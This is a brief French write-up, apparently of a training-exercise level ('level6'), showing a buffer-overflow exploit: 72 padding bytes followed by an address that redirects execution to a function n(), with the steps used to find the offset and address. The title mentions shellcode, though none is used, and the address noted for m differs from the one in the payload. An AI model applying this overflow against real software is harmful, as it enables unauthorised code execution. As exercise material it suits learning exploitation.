# Exploit: Buffer Overflow avec shellcode

**Commande**:  
```bash
./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')
```

**Explication**:  

Ici, nous exploitons une vulnérabilité de débordement de tampon pour écraser l'adresse de retour avec l'adresse de la fonction n().

**Etapes**:  

- Trouver l'adresse de m : objdump -t level6 | grep m : 08048468
- Trouver l'offset : le segfault se fait a 72 caractères
- Payload final : print "a" * 72 + "\x54\x84\x04\x08"